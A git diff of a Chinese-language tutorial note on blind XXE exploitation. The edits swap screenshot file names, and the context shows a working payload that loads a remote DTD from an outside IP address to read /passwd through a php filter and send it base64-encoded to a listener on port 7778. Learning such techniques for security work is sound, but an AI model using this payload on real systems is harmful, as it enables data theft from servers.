@@ -10,7 +10,7 @@ Date: 2026-01-05
 
 首先正常的尝试外部实体调用
 
-![](assets/无回显XXE/file-20260105222313901.png)
+![](assets/无回显XXE/file-20260110224130735.png)
 
 可以看到无回显
 
@@ -24,13 +24,13 @@ Date: 2026-01-05
 ```
 定义参数实体后去SYSTEM到反连地址进行DNSLog解析
 
-![](assets/无回显XXE/file-20260105223115603.png)
+![](assets/无回显XXE/file-20260110224130733.png)
 
  可以看到请求类型
 
 ### 也可以访问本地ip
 
-![](assets/无回显XXE/file-20260105223423993.png)
+![](assets/无回显XXE/file-20260110224130730.png)
 
 用nc监听也可以判断
 并且能够获取到外带地址
@@ -46,14 +46,14 @@ Connection: close
 
 ### 错误示范
 
-![](assets/无回显XXE/file-20260105223820115.png)
+![](assets/无回显XXE/file-20260110224130727.png)
 
 原因：内部DTD禁止参数实体内部再次调用参数实体
 
 但是外部DTD可以重复调用参数实体
 因此需要利用外部实体
 
-![](assets/无回显XXE/file-20260105224253471.png)
+![](assets/无回显XXE/file-20260110224130713.png)
 
 首先在1.dtd写好嵌套php伪协议的file协议读取/passwd
 ```dtd
@@ -73,6 +73,6 @@ Connection: close
 <!DOCTYPE conver [<!ENTITY % sky SYSTEM "http://172.28.222.35:7777/1.dtd"> %sky;%guc;%send;]>
 ```
 
-![](assets/无回显XXE/file-20260106102029281.png)
+![](assets/无回显XXE/file-20260110224130697.png)
 
 成功发送到了7778端口，只需要解码base64即可
